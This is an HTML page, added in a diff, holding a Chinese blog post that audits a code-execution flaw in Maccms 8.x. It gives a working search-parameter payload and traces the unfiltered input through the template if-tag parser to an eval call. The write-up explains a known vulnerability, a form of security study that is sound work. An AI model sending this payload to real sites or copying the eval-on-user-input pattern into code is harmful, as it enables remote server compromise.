@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="payload: /index.php?m=vod-search&amp;amp;wd={if-Z9:phpinfo()}{endif-Z9} ###漏洞简要:wd 参数未经严格过滤导致可以插入程序自写的if标签 经解析导致命令执行 ###代码分析:首先从index.php开始分析开头包含了inc/conn.php而conn.php又包含了inc/common/template.php 这个文件是完成漏">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 | Maccms8.X命令执行">
+<meta property="og:url" content="http://yoursite.com/2018/09/13/代码审计Maccms8.X命令执行/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="payload: /index.php?m=vod-search&amp;amp;wd={if-Z9:phpinfo()}{endif-Z9} ###漏洞简要:wd 参数未经严格过滤导致可以插入程序自写的if标签 经解析导致命令执行 ###代码分析:首先从index.php开始分析开头包含了inc/conn.php而conn.php又包含了inc/common/template.php 这个文件是完成漏">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/nrau74v1g0pby1ejqbc0iz4s/image_1cn8v87tn1p5r1mcjd45ao25aep.png">
+<meta property="og:updated_time" content="2018-09-14T03:17:03.971Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码审计 | Maccms8.X命令执行">
+<meta name="twitter:description" content="payload: /index.php?m=vod-search&amp;amp;wd={if-Z9:phpinfo()}{endif-Z9} ###漏洞简要:wd 参数未经严格过滤导致可以插入程序自写的if标签 经解析导致命令执行 ###代码分析:首先从index.php开始分析开头包含了inc/conn.php而conn.php又包含了inc/common/template.php 这个文件是完成漏">
+<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/nrau74v1g0pby1ejqbc0iz4s/image_1cn8v87tn1p5r1mcjd45ao25aep.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/13/代码审计Maccms8.X命令执行/"/>
+
+
+
+
+
+  <title>代码审计 | Maccms8.X命令执行 | P0rZ9's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">P0rZ9's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/13/代码审计Maccms8.X命令执行/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">代码审计 | Maccms8.X命令执行</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-13T08:15:41+08:00">
+                2018-09-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<pre><code>payload: /index.php?m=vod-search&amp;wd={if-Z9:phpinfo()}{endif-Z9}
+</code></pre><p>###<strong>漏洞简要:</strong><br>wd 参数未经严格过滤导致可以插入程序自写的if标签 经解析导致命令执行</p>
+<p>###<strong>代码分析:</strong><br>首先从<strong>index.php</strong>开始分析<br>开头包含了<code>inc/conn.php</code>而<code>conn.php</code>又包含了<code>inc/common/template.php</code> 这个文件是完成漏洞利用的文件 并且这个文件新建了一个类对象:</p>
+<pre><code>#inc/common/template.php
+class AppTpl
+{
+    var $markname,$markpar,$markdes,$markval,$markhtml;
+    function AppTpl()
+    {
+......
+</code></pre><p>$tpl = new AppTpl();</p>
+<p>接着在第15行:<code>$m = be(&#39;get&#39;,&#39;m&#39;);</code> 跟进<code>be()</code>函数,在<code>inc\common\function.php</code>查看功能,主要是对用户输入的数据进行消毒,防止SQL注入<br>接着分析<strong>index.php</strong></p>
+<pre><code>   #index.php
+   ......
+    $m = be(&apos;get&apos;,&apos;m&apos;);
+if(strpos($m,&apos;.&apos;)){ $m = substr($m,0,strpos($m,&apos;.&apos;)); } 
+$par = explode(&apos;-&apos;,$m);
+$parlen = count($par);
+$ac = $par[0];
+......
+$acs = array(&apos;vod&apos;,&apos;art&apos;,&apos;map&apos;,&apos;user&apos;,&apos;gbook&apos;,&apos;comment&apos;,&apos;label&apos;);
+    if(in_array($ac,$acs)){
+        $tpl-&gt;P[&quot;module&quot;] = $ac;
+        include MAC_ROOT.&apos;/inc/module/&apos;.$ac.&apos;.php&apos;;
+      }
+
+?&gt;
+</code></pre><p>根据payload,我们可得到 <code>\$ac=vod $method=search</code> 第38行包含<code>inc\common\vod.php</code>,我们查看<code>vod.php</code>找到<code>search()</code>方法</p>
+<pre><code># /inc/module/vod.php
+......
+elseif($method==&apos;search&apos;)
+{
+    $tpl-&gt;P[&quot;siteaid&quot;] = 15;
+    $wd = be(&quot;all&quot;, &quot;wd&quot;);//对传入的wd参数进行消毒
+    if(!empty($wd)){ $tpl-&gt;P[&quot;wd&quot;] = $wd; }
+......
+    $tpl-&gt;H = loadFile(MAC_ROOT_TEMPLATE.&quot;/vod_search.html&quot;);
+    //加载模板文件
+    $tpl-&gt;mark();
+    $tpl-&gt;pageshow();
+    $colarr = array(&apos;{page:des}&apos;,&apos;{page:key}&apos;,&apos;{page:now}&apos;,&apos;{page:order}&apos;,&apos;{page:by}&apos;,&apos;{page:wd}&apos;,&apos;{page:wdencode}&apos;,&apos;{page:pinyin}&apos;,&apos;{page:letter}&apos;,&apos;{page:year}&apos;,&apos;{page:starring}&apos;,&apos;{page:starringencode}&apos;,&apos;{page:directed}&apos;,&apos;{page:directedencode}&apos;,&apos;{page:area}&apos;,&apos;{page:areaencode}&apos;,&apos;{page:lang}&apos;,&apos;{page:langencode}&apos;,&apos;{page:typeid}&apos;,&apos;{page:typepid}&apos;,&apos;{page:classid}&apos;);
+    $valarr = array($tpl-&gt;P[&quot;des&quot;],$tpl-&gt;P[&quot;key&quot;],$tpl-&gt;P[&quot;pg&quot;],$tpl-&gt;P[&quot;order&quot;],$tpl-&gt;P[&quot;by&quot;],$tpl-&gt;P[&quot;wd&quot;],urlencode($tpl-&gt;P[&quot;wd&quot;]),$tpl-&gt;P[&quot;pinyin&quot;],$tpl-&gt;P[&quot;letter&quot;],$tpl-&gt;P[&apos;year&apos;]==0?&apos;&apos;:$tpl-&gt;P[&apos;year&apos;],$tpl-&gt;P[&quot;starring&quot;],urlencode($tpl-&gt;P[&quot;starring&quot;]),$tpl-&gt;P[&quot;directed&quot;],urlencode($tpl-&gt;P[&quot;directed&quot;]),$tpl-&gt;P[&quot;area&quot;],urlencode($tpl-&gt;P[&quot;area&quot;]),$tpl-&gt;P[&quot;lang&quot;],urlencode($tpl-&gt;P[&quot;lang&quot;]),$tpl-&gt;P[&apos;typeid&apos;],$tpl-&gt;P[&apos;typepid&apos;] ,$tpl-&gt;P[&apos;classid&apos;]  );
+    $tpl-&gt;H = str_replace($colarr, $valarr ,$tpl-&gt;H);
+    //直接写入模板文件
+</code></pre><p>这里把我们传入的<code>wd={if-Z9:phpinfo()}{endif-Z9}</code> 赋值给 <code>\$tpl-&gt;P[&quot;wd&quot;]</code> 且这里<code>$tpl-&gt;H = str_replace($colarr, $valarr ,$tpl-&gt;H);</code>对<code>$tpl-&gt;H</code>即vod_search.html做了内容替换,将所有形如:<code>{page:wd}</code>都被替换为<code>{if-A:phpinfo()}{endif-A}</code></p>
+<p>接着分析index.php</p>
+<pre><code>#index.php
+......
+    $tpl-&gt;ifex();
+    if(!empty($tpl-&gt;P[&apos;cp&apos;])){ setPageCache($tpl-&gt;P[&apos;cp&apos;],$tpl-&gt;P[&apos;cn&apos;],$tpl-&gt;H); }
+    $tpl-&gt;run();
+    echo $tpl-&gt;H;
+</code></pre><p>在这里调用了<code>ifex()</code>函数 我们跟进<code>template.php</code>查看:</p>
+<pre><code>#/inc/common/template.php
+......
+function ifex()
+{
+    if (!strpos(&quot;,&quot;.$this-&gt;H,&quot;{if-&quot;)) { return; }
+    $labelRule = buildregx(&apos;{if-([\s\S]*?):([\s\S]+?)}([\s\S]*?){endif-\1}&apos;,&quot;is&quot;);
+    //定义了正则规则
+    preg_match_all($labelRule,$this-&gt;H,$iar);
+    //匹配出正则提取出来的参数,得到一个二维数组$iar
+    $arlen=count($iar[2]);
+
+    for($m=0;$m&lt;$arlen;$m++){//进入循环
+        $strn = $iar[1][$m];    //Z9
+    $strif= asp2phpif( $iar[2][$m] ) ; //phpinfo
+        $strThen= $iar[3][$m];   // 空的
+......
+</code></pre><p>审计到这里<code>$strif</code>成功的接收了我们插入的php代码(phpinfo) 接着我们要实现eval 接着分析<code>template.php</code></p>
+<p>不满足878行的if条件:</p>
+<pre><code>if (strpos(&quot;,&quot;.$strThen,$labelRule2)&gt;0){
+</code></pre><p>不满足905行的if条件:</p>
+<pre><code>if (strpos(&quot;,&quot;.$strThen,$labelRule3)&gt;0){
+</code></pre><p>最后进入了没限制的913行的eval函数:</p>
+<pre><code>@eval(&quot;if($strif){\$ifFlag=true;}else{\$ifFlag=false;}&quot;);
+</code></pre><p>造成命令执行。</p>
+<p><strong>漏洞利用:</strong><br><img src="http://static.zybuluo.com/chhyx/nrau74v1g0pby1ejqbc0iz4s/image_1cn8v87tn1p5r1mcjd45ao25aep.png" alt="image_1cn8v87tn1p5r1mcjd45ao25aep.png-58.1kB"></p>
+<p><strong>源码下载</strong>:<a href="http://www.maccms.com/down.html1cn8v87tn1p5r1mcjd45ao25aep.png" target="_blank" rel="noopener">Maccms</a></p>
+<p>参考文章:<br><a href="http://www.cnblogs.com/test404/p/7397755.html" target="_blank" rel="noopener">http://www.cnblogs.com/test404/p/7397755.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/12/DEDECMS历史难题--找后台目录/" rel="next" title="DEDECMS历史难题--找后台目录">
+                <i class="fa fa-chevron-left"></i> DEDECMS历史难题--找后台目录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/14/preg_replace函数与命令执行/" rel="prev" title="浅淡preg_replace函数与命令执行">
+                浅淡preg_replace函数与命令执行 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">P0rZ9</p>
+              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P0rZ9</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
